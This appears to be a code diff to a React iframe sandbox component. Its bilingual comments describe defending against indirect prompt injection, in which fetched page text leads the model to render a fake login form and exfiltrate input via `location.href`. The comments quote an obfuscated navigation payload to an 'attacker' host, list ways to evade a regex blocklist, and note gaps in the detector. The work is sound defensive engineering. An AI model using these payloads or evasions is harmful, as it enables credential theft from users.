@@ -402,60 +402,89 @@ function SandboxArtifactFrameComponent({ artifact }: SandboxArtifactFrameProps) 
     [artifact, isMounted, locale]
   );
 
-  // --- トップレベル遷移の検出（sandbox="allow-scripts" は自身の遷移までは止めない） -------
+  // --- トップレベル遷移対策（sandbox="allow-scripts" は自身の遷移までは止めない） ---------
   // iframe の sandbox 属性に allow-top-navigation を与えていなくても、iframe 自身の
   // ブラウジングコンテキストを他のURLへ遷移させること（例: `location.href = "https://..."`）
   // は防げない。allow-top-navigation は「親ページを道連れにする遷移」だけを止める属性で、
   // フレーム自身の遷移には無関係。CSPのconnect-src等もfetch/XHRなどの「接続」は塞ぐが、
-  // ブラウザのナビゲーション（location遷移・a要素のクリック等）は対象外（navigate-to は
-  // 各ブラウザから廃止済み）。したがって、外部を読み取ったLLM出力からの間接プロンプト
-  // インジェクションで偽ログインフォームを描画し、入力値をURLクエリに載せて
-  // `location.href` で攻撃者サーバーへ送る、という経路をJS側の禁止語チェック
-  // （services/generative_ui.py の正規表現ブロックリスト）だけでは塞ぎきれない
-  // （分割文字列・`atob`・`(0,eval)` 等で容易に回避されるため）。
+  // ブラウザのナビゲーション（location遷移・a要素のクリック・meta refresh等）は
+  // connect-srcの対象外（navigate-to は各ブラウザから廃止済み）。したがって、外部を
+  // 読み取ったLLM出力からの間接プロンプトインジェクションで偽ログインフォームを描画し、
+  // 入力値をURLクエリに載せて `location.href` で攻撃者サーバーへ送る、という経路をJS側の
+  // 禁止語チェック（services/generative_ui.py の正規表現ブロックリスト）だけでは
+  // 塞ぎきれない（分割文字列・`atob`・`(0,eval)` 等で容易に回避されるため）。
   //
-  // ここでは実行境界（このコンポーネント）側で遷移を検出する。iframe は
-  // allow-same-origin を与えていないopaque originなので、親から
-  // `iframe.contentWindow.location` を読むことはできない（読もうとするとSecurityError）。
-  // そのため「どこへ遷移したか」は分からないが、「想定したsrcdoc以外の何かへ遷移した」こと
-  // だけは、iframe要素のload イベント回数から推定できる: srcdocを割り当てた後に来る
-  // 1回目のloadは初回表示、2回目以降のloadは、フレーム自身が別のドキュメントへナビゲート
-  // した結果としてしか起こり得ない（同一ドキュメント内のフラグメント遷移や内部の
-  // DOM書き換えではloadは再発火しない）。ヘッドレスChromiumでの実測でも、
-  // `self["loc"+"ation"].href = "..."` の実行後にiframe要素のloadが2回目として発火し、
-  // その時点で既に外部へのリクエストが実際に送出されていることを確認済み。
+  // 主たる防御は frame-src（親アプリのCSP。frontend/next.config.mjs の securityHeaders に
+  // `frame-src 'self'` として設定）。CSPのframe-srcはナビゲーション先URLをリクエスト
+  // 送出前にブロックする仕組みで、このiframeがabout:srcdocから外部URLへ自己遷移しようと
+  // するケースも実際に止まることを実測済み（下記参照）。ここでのloadイベント回数による
+  // 検出は、その防御が何らかの理由で効かない場合（親のCSPヘッダーが経路上で欠落・改変
+  // された場合など）に備えた第二層であり、本命ではない。
   //
-  // 重要な限界: この仕組みは「遷移が完了して load が発火した後」にしか気づけないため、
-  // 遷移によるリクエスト自体は少なくとも1回は発射されてしまう（＝完全な防止ではなく、
-  // 気づいた時点でフレームを破棄し、以後の被害の継続だけを止める事後対策）。根本対策は
-  // 生成UIを専用オリジン（例: sandbox.<host>）で配信すること（別フェーズ、今回未実施）。
+  // 実測（ヘッドレスChromium、実際に buildSandboxArtifactSrcDoc が生成するsrcdocを使用）:
+  // - 親CSPに frame-src が無い場合: 起動直後に同期的に
+  //   `self["loc"+"ation"].href = "https://attacker/..."` を実行すると、外部への
+  //   HTTPリクエストが実際に送出される。3回連続で204応答エンドポイントへ遷移させても
+  //   3回とも到達する（繰り返しの持ち出しが可能）。
+  // - 親CSPに `frame-src 'self'` がある場合: 同じペイロード（同期・setTimeout遅延の
+  //   両方）、meta refresh、204への繰り返し遷移のいずれも、ネットワークリクエストが
+  //   一切送出されない状態でブロックされる（securitypolicyviolationイベントが
+  //   frame-src違反として発火する）。一方、about:srcdocの初回読み込みと通常の
+  //   アーティファクトの描画（ready到達）は `frame-src 'self'` の有無に関わらず
+  //   問題なく動作する。
   //
-  // Top-level navigation detection (sandbox="allow-scripts" does not stop the frame from
+  // 以下のloadイベントカウンタには既知の穴がある: アーティファクトのJavaScriptは
+  // ドキュメント解析中に同期実行されるため、その場で `location.href = ...` を代入すると
+  // 遷移が初回ドキュメントのloadより先に始まり、元のsrcdocのloadは発火しないまま
+  // 遷移後（または失敗後）のドキュメントのloadが「1回目」としてカウントされてしまう。
+  // そのため2回目のloadは永遠に来ず、この仕組み単体では同期遷移を検出できない
+  // （setTimeoutなどで遅延された遷移は初回loadの後に来るため検出できる）。また、
+  // 204応答やダウンロードのようにブラウザが「遷移しない」と判断するケースはloadの
+  // 増分を伴わないため、frame-srcが効かない状況ではこの検出も無力。つまりこのカウンタ
+  // 方式単独では前述の2パターンを見逃す。frame-srcで大半のケースが事前に止まる前提の
+  // もとでの補助的な仕組みとして残している。
+  //
+  // Top-level navigation defense (sandbox="allow-scripts" does not stop the frame from
   // navigating itself). Without allow-top-navigation, the sandbox still cannot stop the
   // iframe's own browsing context from navigating to another URL (e.g.
   // `location.href = "https://..."`) - allow-top-navigation only guards against the frame
   // dragging the *parent* page along. CSP's connect-src etc. block fetch/XHR "connections",
-  // not browser navigation (location assignment, clicking an <a>); `navigate-to` has been
-  // removed from every browser. So an indirect prompt injection (fetched page text -> model
-  // -> artifact) can render a fake login form and exfiltrate input via a URL query through
-  // `location.href`, and the server-side banned-token regex (services/generative_ui.py)
-  // alone cannot close that path (it is bypassed by split strings, atob, (0,eval), etc.).
+  // not browser navigation (location assignment, clicking an <a>, meta refresh); `navigate-to`
+  // has been removed from every browser. So an indirect prompt injection (fetched page text ->
+  // model -> artifact) can render a fake login form and exfiltrate input via a URL query
+  // through `location.href`, and the server-side banned-token regex
+  // (services/generative_ui.py) alone cannot close that path (bypassed by split strings, atob,
+  // (0,eval), etc.).
   //
-  // Detection therefore lives at the execution boundary (this component). The iframe has no
-  // allow-same-origin, so it has an opaque origin and the parent cannot read
-  // `iframe.contentWindow.location` (doing so throws a SecurityError). We cannot see *where*
-  // it navigated, but we can infer *that* it navigated away from the srcdoc we set, from how
-  // many times the iframe element's load event fires: the first load after assigning srcdoc
-  // is the initial render; any load after that can only be caused by the frame navigating to
-  // a different document (a same-document fragment change or in-page DOM mutation never
-  // re-fires load). A real headless-Chromium run confirmed this: after executing
-  // `self["loc"+"ation"].href = "..."`, the iframe element's load fired a second time, and by
-  // then the outbound request had already actually been sent.
+  // The primary defense is frame-src (the parent app's CSP, set as `frame-src 'self'` in
+  // securityHeaders in frontend/next.config.mjs). CSP's frame-src blocks a navigation target
+  // before the request is ever sent, and this was confirmed to also cover this iframe
+  // self-navigating away from about:srcdoc to an external origin (see below). The load-event
+  // counter here is a second layer for if that header is ever missing or stripped in transit -
+  // it is not the primary defense.
   //
-  // Important limitation: because this only fires once the navigation's load event has
-  // completed, the navigation request itself is sent at least once before we can react - this
-  // is damage containment after the fact, not prevention. The real fix is serving generated
-  // UI from a dedicated origin (e.g. sandbox.<host>), left for a later phase.
+  // Measured against real headless Chromium, using the exact srcdoc buildSandboxArtifactSrcDoc
+  // produces:
+  // - Without frame-src on the parent CSP: a synchronous
+  //   `self["loc"+"ation"].href = "https://attacker/..."` at artifact startup actually sends
+  //   the request. Three navigations in a row to a 204-responding endpoint all reach the
+  //   attacker (repeatable exfiltration).
+  // - With `frame-src 'self'` on the parent CSP: the same payload (both synchronous and
+  //   setTimeout-deferred), a meta-refresh, and repeated navigations to a 204 endpoint are all
+  //   blocked with zero network requests sent (a securitypolicyviolation for frame-src fires
+  //   instead). The initial about:srcdoc load and a normal artifact reaching "ready" are
+  //   unaffected either way.
+  //
+  // The load-event counter below has a known gap: artifact JavaScript runs synchronously while
+  // the document is still parsing, so assigning `location.href` right away starts the
+  // navigation before the original document's own load ever fires - the original load never
+  // happens, and the navigated-to (or failed) document's load is counted as the "first" one.
+  // A second load then never arrives, so this counter alone cannot detect a synchronous
+  // navigation (a setTimeout-deferred one still fires after the counted first load and is
+  // caught). A navigation the browser treats as "not a navigation" (a 204 response, a
+  // download) also never increments the count. This counter is kept only as a fallback for
+  // when frame-src is expected to catch nearly everything; on its own it misses both patterns
+  // above.
   const lastSrcDocRef = useRef<string | undefined>(undefined);
   const loadCountRef = useRef(0);
   // レンダー中に比較してリセットする（useEffectで遅らせない）。about:blank の初期表示から
